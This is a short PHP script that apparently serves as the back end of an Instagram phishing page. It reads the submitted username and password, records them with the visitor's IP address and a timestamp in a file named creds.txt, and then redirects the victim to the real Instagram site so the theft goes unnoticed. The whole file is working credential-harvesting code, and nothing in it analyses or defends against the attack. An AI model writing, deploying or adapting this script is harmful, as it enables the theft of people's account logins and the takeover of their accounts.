<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");
$file = fopen("creds.txt", "a");
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n");
fwrite($file, "IP Address: " . $ip . "\n");
fwrite($file, "Date: " . $date . "\n\n");
fclose($file);

header('Location: https://www.instagram.com/');
exit;
?>
